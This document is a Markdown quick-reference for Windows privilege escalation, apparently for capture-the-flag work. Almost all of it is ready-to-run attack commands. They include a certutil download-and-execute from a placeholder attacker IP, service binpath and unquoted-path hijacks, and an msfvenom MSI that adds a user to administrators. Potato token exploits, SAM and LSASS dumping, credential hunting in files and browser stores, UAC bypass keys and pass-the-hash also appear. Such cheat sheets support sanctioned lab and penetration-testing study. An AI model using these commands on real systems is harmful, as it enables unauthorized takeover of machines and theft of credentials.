# Windows Privilege Escalation — Quick Reference

Upstream covers Linux privesc only. Use when you have a low-priv shell on a Windows CTF box.

## Recon — one sweep

```cmd
whoami /all                      &:: user, groups, ALL privileges
systeminfo                       &:: OS version + hotfixes (missing patch = CVE)
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
net user                         &:: other users
net localgroup administrators
tasklist /SVC                    &:: services + PIDs
wmic service get name,pathname,startmode | findstr /i "auto"    &:: unquoted path hunt
netstat -ano                     &:: listening ports
dir /a C:\                       &:: hidden stuff
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Automated:
```cmd
:: winPEAS (run from user-writable temp)
certutil -urlcache -f http://YOURIP:8000/winPEASx64.exe C:\Windows\Temp\wp.exe && wp.exe
:: PowerUp.ps1
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
```

## Service abuse

**Unquoted service path** (path with spaces + service runs as SYSTEM):
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows"
:: e.g. C:\Program Files\Vuln Service\svc.exe  -> drop C:\Program.exe
copy /Y evil.exe "C:\Program.exe"
sc stop VulnSvc & sc start VulnSvc
```

**Weak service permissions** (use accesschk from Sysinternals):
```cmd
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
:: SERVICE_CHANGE_CONFIG -> reconfigure binpath:
sc config VulnSvc binpath= "C:\Windows\Temp\evil.exe"
sc stop VulnSvc & sc start VulnSvc
:: or net localgroup administrators user /add as binpath
```

**Registry service config:**
```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Services /s /v ImagePath | findstr /i "exe"
:: writable ImagePath -> overwrite -> restart service
```

**DLL hijack:** find missing DLLs (Process Monitor), drop in writable app dir.

**AlwaysInstallElevated:**
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: both = 0x1 -> malicious MSI as SYSTEM:
msfvenom -p windows/x64/exec CMD='net localgroup administrators <user> /add' -f msi -o r.msi
msiexec /quiet /qn /i C:\Windows\Temp\r.msi
```

## Token / impersonation

```cmd
whoami /priv
:: SeImpersonatePrivilege (service accounts, IIS) -> JuicyPotato / PrintSpoofer / GodPotato
::   Win <10 1809: JuicyPotato; newer: PrintSpoofer.exe -c "cmd /c whoami"
:: SeBackupPrivilege  -> copy SAM/SYSTEM: robocopy /b C:\Windows\System32\config . hives
::   then secretsdump.py -system SYSTEM -sam SAM local
:: SeRestorePrivilege -> overwrite service binaries
:: SeTakeOwnershipPrivilege -> takeown /f C:\Windows\System32\utilman.exe
:: SeLoadDriverPrivilege -> load vulnerable driver (CAPCOM.SYS classic)
:: SeDebugPrivilege -> access lsass: comsvcs MiniDump -> pypykatz
:: potato family summary: JuicyPotato (<=1808), RoguePotato, SweetPotato,
::   PrintSpoofer (Spooler), GodPotato (2016-2019 patched), EfsPotato, CoercedPotato
```

## Credential hunting

```cmd
:: Saved creds
cmdkey /list
runas /savecred /user:administrator "cmd /c whoami > C:\Windows\Temp\o.txt"
:: Registry autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
:: Files
dir /s /b C:\Users\*.xml C:\Users\*.kdbx C:\inetpub\*.config 2>nul
findstr /si password C:\inetpub\wwwroot\web.config
:: Unattended installs
type C:\Windows\Panther\Unattend.xml C:\Windows\System32\sysprep\sysprep.xml 2>nul
:: DPAPI (needs user context): SharpDPAPI / mimikatz dpapi::chrome
:: LSASS (SeDebug or admin): rundll32 comsvcs.dll MiniDump <pid> dump.dmp full
```

## UAC bypass (medium -> high integrity, admin in group)

```
fodhelper.exe  (reg hijack HKCU\Software\Classes\ms-settings\Shell\Open\command)
eventvwr.exe   (same key pattern)
sdclt.exe      (HKCU\...\Shell\Open\command via DelegateExecute)
computerdefaults.exe
Quick check: PowerShell Empire/Ghostpack sharpup, or metasploit exploit/windows/local/bypassuac*
```

## Kernel exploits

```cmd
systeminfo > sys.txt
:: paste to https://iag0110.github.io/ or run windows-exploit-suggester.py
:: classics: MS16-032 (Secondary Logon), CVE-2021-1732, PrintNightmare CVE-2021-34527
:: PrintNightmare needs no reboot: rpcdump + exploit via NTLM relay or package-less DLL
```

## Misc quick wins

```
- Scheduled tasks: schtasks /query /fo LIST /v | findstr /i "taskname run as"
- WMI subscriptions (needs admin already)
- GPP passwords: findstr /i cpassword \\domain\SYSVOL\*.xml -> gpp-decrypt
- Firefox stored: %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json + key4.db
- PowerShell history: type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
- SMB null sessions: net use \\target\IPC$ "" /user:""
- Pass-the-hash: psexec.py -hashes :NTLM user@target (impacket)
```
